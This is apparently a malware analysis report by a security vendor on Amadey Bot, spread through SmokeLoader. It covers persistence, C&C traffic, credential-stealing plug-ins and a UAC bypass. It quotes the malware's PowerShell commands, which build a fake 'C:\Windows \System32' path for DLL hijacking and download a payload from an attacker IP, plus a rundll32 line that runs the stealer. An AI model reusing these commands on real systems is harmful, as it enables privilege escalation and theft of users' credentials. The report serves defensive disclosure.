Amadey Bot Being Distributed Through SmokeLoader

July 21, 2022

Amadey Bot, a malware that was first discovered in 2018, is capable of stealing information
and installing additional malware by receiving commands from the attacker. Like other
malware strains, it has been sold in illegal forums and used by various attackers.
The ASEC analysis team previously revealed cases where Amadey was used on attacks in
the ASEC blog posted in 2019 (English version unavailable). Amadey was mainly used to
install ransomware by attackers of GandCrab or to install FlawedAmmyy by the TA505 group
that is infamous for Clop ransomware. The attackers of Fallout Exploit Kit and Rig Exploit
Kit are also known for using Amadey.
The team has recently discovered that Amadey is being installed by SmokeLoader.
SmokeLoader is a malware that has continuously been distributed during the last few years,
taking up high proportion in the recent ASEC statistics. It is recently distributed by having
users download the malware that is disguised as software cracks and serial generation
programs from websites for distribution.
SmokeLoader provides various additional features related to info-stealing as plug-ins. It is
normally used to install additional malware strains as a downloader. When SmokeLoader is
run, it injects Main Bot into the currently running explorer process (explorer.exe). This means

Bot that performs actual malicious behaviors operates inside the explorer process. The figure
below shows AhnLab’s ASD log of SmokeLoader, which has been injected into explorer,
downloading Amadey.

When Amadey is run, it first copies itself to the Temp path below. Then, Amadey registers the
folder where it exists as a startup folder to allow itself to be run after reboot. It also provides a
feature to register itself to Task Scheduler to maintain persistence.

After going through the process mentioned above, the malware starts communicating with
the C&C server. The following Fiddler log shows Amadey communicating with the C&C
server, downloading the cred.dll plug-in to collect user environment information and send aos
매to the C&C server, and installing RedLine info-stealer as an additional malware strain.

Figure 3. Amadey’s network traffic
The malware collects the information of the infected system before it connects to the C&C
server. The information collected includes basic information such as computer name and
user name, as well as a list of installed anti-malware products. Each part of the collected
information is sent to the C&C server in an appropriate format. The server then can send the
URL of additional malware strains that Amadey will download to make it operate as a
downloader.

The table above indicates that the current version of Amadey discussed in this post is 3.21.
Accessing the C&C panel of the current Amadey version under analysis shows how the
current version is slightly different from the previous one.

Among items sent to the C&C server, “av” refers to the information of anti-malware installed
on the infected environment. Each number is assigned to a particular anti-malware product.
As ’13’ is chosen if the infected environment is Windows 10 or Windows Server 2019, it is
likely the number is reserved for Windows Defender.

Amadey also periodically takes screenshots and sends them to the C&C server. It captures
the current screen in a JPG format and saves it with the name “129858768759” in the
%TEMP% path. The screenshot is later sent to the C&C server with the POST method.

Figure 7. Sending screenshots to the C&C server
The network traffic figure shown above has “cred.dll”, meaning the malware downloaded a
plug-in for stealing information. The plug-in developed with the Delphi programming
language is downloaded to the %APPDATA% path. It is then run through rundll32.exe as
having the Export function Main() as an argument as shown below.
> rundll32.exe %APPDATA%\406d6c22b040c6\cred.dll, Main
The list of information that is stolen includes emails, FTPs, VPN clients, etc. The information
collected is sent to the same C&C server.

– WinSCP
The Fiddler log mentioned above shows how Amadey installed additional malware from
“hxxp://185.17.0[.]52/yuri.exe” besides the cred.dll plug-in. When Amadey periodically
communicates with the C&C server to send the information of the infected system, the server
usually sends the NULL data back. However, it can send a downloader command depending
on the command. The downloader command is sent with encoded data, and decoding it will
allow the malware to receive an URL for downloading additional malware. The malware
downloaded from the URL is RedLine info-stealer.

Accessing “hxxp://185.17.0[.]52/” shows a list of files.

xyz.exe and bin, which are downloader malware types, are developed with the Rust
programming language. xyz.exe downloads bin and supports privilege escalation using the
UAC bypass technique. The technique exploits AutoElevate and the mechanisms of AIS.
9/12

AutoElevate is a program with the “<autoElevate>true</autoElevate>” property as shown
below. If certain conditions are met, it can be run as admin privilege without a UAC pop-up.

Figure 10.

FXSUNATD.exe with the AutoElevate property
To do so, the program needs to be run in a trusted location such as System32 besides the
property mentioned above. Hence the malware created the “C:\Windows \System32\” folder
as shown below and copied “FXSUNATD.exe” (AutoElevate program) to satisfy the
condition. AIS ignores spacings when internally checking paths. So if “FXSUNATD.exe” is
run in the path mentioned earlier, it is recognized as being executed from a normal System32
path. The path check is successful and the program is run as AutoElevate (admin privilege).
> powershell.exe “New-Item -ItemType Directory ‘\?\C:\Windows \System32’; CopyItem -Path ‘C:\Windows\System32\FXSUNATD.exe’ -Destination ‘C:\Windows
\System32\’; powershell -windowstyle hidden $ProgressPreference= ‘SilentlyContinue’;
Invoke-WebRequest hxxp://185.17.0[.]52/bin -Outfile ‘C:\Windows
\System32\version.dll'”
> powershell.exe “Start-Process ‘C:\Windows \System32\FXSUNATD.exe'”
The malware then downloads a malicious DLL named version.dll in the same path.
version.dll is a DLL used by “FXSUNATD.exe”. If the file is in the same path as
“FXSUNATD.exe”, the DLL is executed first following the DLL load order when the exe
program is run. The process is called DLL hijacking. By exploiting this mechanic, the
malware loaded on a normal program is executed as “FXSUNATD.exe” is run after the
malicious DLL (version.dll) is created in the same path.

Figure 11. Process tree of Amadey downloader
bin (version.dll) loaded and executed by “FXSUNATD.exe” is a downloader that installs
Amadey and RedLine. When it is run, it uses the Windows Defender command to register
the %ALLUSERSPROFILE% folder and %LOCALAPPDATA% directory that includes the
Temp directory as exclusions. It then downloads and runs each malware type.

Initially distributed through exploit kits in the past, Amadey has been installed through
SmokeLoader from malicious websites disguised as download pages for cracks and serials
of commercial software until recently. Once the malware is installed, it can stay in the system
to steal user information and download additional payloads. Users should apply the latest
patch for OS and programs such as Internet browsers, and update V3 to the latest version to
prevent malware infection in advance.
